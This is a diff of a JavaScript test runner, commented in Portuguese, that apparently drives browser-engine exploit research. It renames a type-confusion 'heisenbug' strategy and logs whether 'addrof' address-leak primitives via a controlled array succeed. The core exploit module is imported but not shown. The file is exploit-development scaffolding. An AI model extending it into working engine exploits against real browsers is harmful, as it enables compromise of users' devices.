@@ -2,15 +2,15 @@
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
 import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
 import {
-    executeTypedArrayVictimAddrofTest_ForceNumericLeakInConfusedDetails, // NOME DA FUNÇÃO ATUALIZADO
-    FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLCD // NOME DO MÓDULO ATUALIZADO
+    executeTypedArrayVictimAddrofTest_ControlFlowObject, // NOME DA FUNÇÃO ATUALIZADO
+    FNAME_MODULE_TYPEDARRAY_ADDROF_V39_CFO // NOME DO MÓDULO ATUALIZADO
 } from './testArrayBufferVictimCrash.mjs';
 
 async function runHeisenbugReproStrategy_TypedArrayVictim() {
-    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_ForceNumericLeakInConfusedDetails";
-    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (ForceNumericLeakInConfusedDetails) ====`, 'test', FNAME_RUNNER);
+    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_ControlFlowObject";
+    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (ControlFlowObject) ====`, 'test', FNAME_RUNNER);
 
-    const result = await executeTypedArrayVictimAddrofTest_ForceNumericLeakInConfusedDetails();
+    const result = await executeTypedArrayVictimAddrofTest_ControlFlowObject();
 
     logS3(`  Total de chamadas da sonda toJSON: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER);
     if (result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.length > 0) {
@@ -19,7 +19,7 @@ async function runHeisenbugReproStrategy_TypedArrayVictim() {
 
     if (result.errorOccurred) {
         logS3(`  RESULTADO: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
-        document.title = `Heisenbug (TypedArray-FNLCD) ERR: ${result.errorOccurred.name}`;
+        document.title = `Heisenbug (TypedArray-CFO) ERR: ${result.errorOccurred.name}`;
         if (result.errorOccurred.name === 'TypeError' && result.errorOccurred.message.includes("circular structure")) {
             logS3(`    NOTA: TypeError de estrutura circular. Isso é esperado se o objeto C1 modificado foi serializado com sucesso pelo stringify principal e depois novamente pelo logger do runner.`, "info");
         }
@@ -28,32 +28,29 @@ async function runHeisenbugReproStrategy_TypedArrayVictim() {
         logS3(`  Stringify Output Final (Parseado): ${result.stringifyResult ? JSON.stringify(result.stringifyResult) : 'N/A'}`, "info", FNAME_RUNNER);
 
         let heisenbugOnC1 = false;
-        // A confirmação da Heisenbug agora é se o C1 (stringifyOutput_parsed) contém os payloads
-        // ou se a sonda confirmou a atribuição numérica
         const call2Details = result.all_probe_calls_for_analysis.find(d => d.call_number === 2);
-        if (call2Details && call2Details.this_is_C1_details_obj && call2Details.payload_A_assigned_as_num) {
+        if (call2Details && call2Details.this_is_C1_details_obj && call2Details.controlled_array_assigned) {
             heisenbugOnC1 = true;
         }
 
         if(heisenbugOnC1){
-            logS3(`  !!!! HEISENBUG & ATRIBUIÇÃO NUMÉRICA CONFIRMADAS PELA SONDA !!!!`, "critical", FNAME_RUNNER);
+            logS3(`  !!!! HEISENBUG & CONTROLLED ARRAY ATTEMPT CONFIRMADAS PELA SONDA !!!!`, "critical", FNAME_RUNNER);
         } else {
-            logS3(`  ALERT: Heisenbug/Atribuição Numérica NÃO CONFIRMADA PELA SONDA.`, "error", FNAME_RUNNER);
+            logS3(`  ALERT: Heisenbug/Controlled Array Attempt NÃO CONFIRMADA PELA SONDA.`, "error", FNAME_RUNNER);
         }
 
         let anyAddrofSuccess = false;
         if (result.addrof_A_result && result.addrof_A_result.success) {
-            logS3(`    ADDROF A (from C1.payload_A) SUCESSO! ${result.addrof_A_result.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
+            logS3(`    ADDROF A (from controlled array) SUCESSO! ${result.addrof_A_result.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
         } else if (result.addrof_A_result) {
-            logS3(`    ADDROF A (from C1.payload_A) FALHOU: ${result.addrof_A_result.msg}`, "warn", FNAME_RUNNER);
+            logS3(`    ADDROF A (from controlled array) FALHOU: ${result.addrof_A_result.msg}`, "warn", FNAME_RUNNER);
         }
         if (result.addrof_B_result && result.addrof_B_result.success) {
-            logS3(`    ADDROF B (from C1.payload_B) SUCESSO! ${result.addrof_B_result.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
+            logS3(`    ADDROF B (from controlled array) SUCESSO! ${result.addrof_B_result.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
         } else if (result.addrof_B_result) {
-            logS3(`    ADDROF B (from C1.payload_B) FALHOU: ${result.addrof_B_result.msg}`, "warn", FNAME_RUNNER);
+            logS3(`    ADDROF B (from controlled array) FALHOU: ${result.addrof_B_result.msg}`, "warn", FNAME_RUNNER);
         }
 
-        // Detalhes da sonda interna podem ter erros, mesmo que o teste principal não tenha
         let lastCallProbeDetails = null;
         if(result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.length > 0){
             lastCallProbeDetails = result.all_probe_calls_for_analysis[result.all_probe_calls_for_analysis.length-1];
@@ -63,21 +60,21 @@ async function runHeisenbugReproStrategy_TypedArrayVictim() {
         }
 
         if (anyAddrofSuccess) {
-            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLCD}: AddrInC1 SUCCESS!`;
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V39_CFO}: Addr SUCCESS!`;
         } else if (heisenbugOnC1) {
-            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLCD}: C1_TC OK, Addr Fail`;
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V39_CFO}: C1_TC OK, Addr Fail`;
         } else {
-            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLCD}: No C1_TC?`;
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V39_CFO}: No C1_TC?`;
         }
     }
     logS3(`  Título da página: ${document.title}`, "info");
     await PAUSE_S3(MEDIUM_PAUSE_S3);
 
-    logS3(`==== Estratégia de Reprodução do Heisenbug (ForceNumericLeakInConfusedDetails) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
+    logS3(`==== Estratégia de Reprodução do Heisenbug (ControlFlowObject) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
 }
 
 export async function runAllAdvancedTestsS3() {
-    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLCD}_MainOrchestrator`;
+    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V39_CFO}_MainOrchestrator`;
     const runBtn = getRunBtnAdvancedS3();
     const outputDiv = getOutputAdvancedS3();
 
@@ -85,18 +82,18 @@ export async function runAllAdvancedTestsS3() {
     if (outputDiv) outputDiv.innerHTML = '';
 
     logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
-    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (ForceNumericLeakInConfusedDetails) ====`, 'test', FNAME_ORCHESTRATOR);
+    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (ControlFlowObject) ====`, 'test', FNAME_ORCHESTRATOR);
 
     await runHeisenbugReproStrategy_TypedArrayVictim();
 
     logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
     if (runBtn) runBtn.disabled = false;
 
-    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLCD)) {
+    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V39_CFO)) {
         if (!document.title.includes("CRASH") && !document.title.includes("RangeError") &&
             !document.title.includes("SUCCESS") && !document.title.includes("Addr Fail") &&
             !document.title.includes("ERR") && !document.title.includes("C1_TC OK")) {
-            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V38_FNLCD} Concluído`;
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V39_CFO} Concluído`;
         }
     }
 }
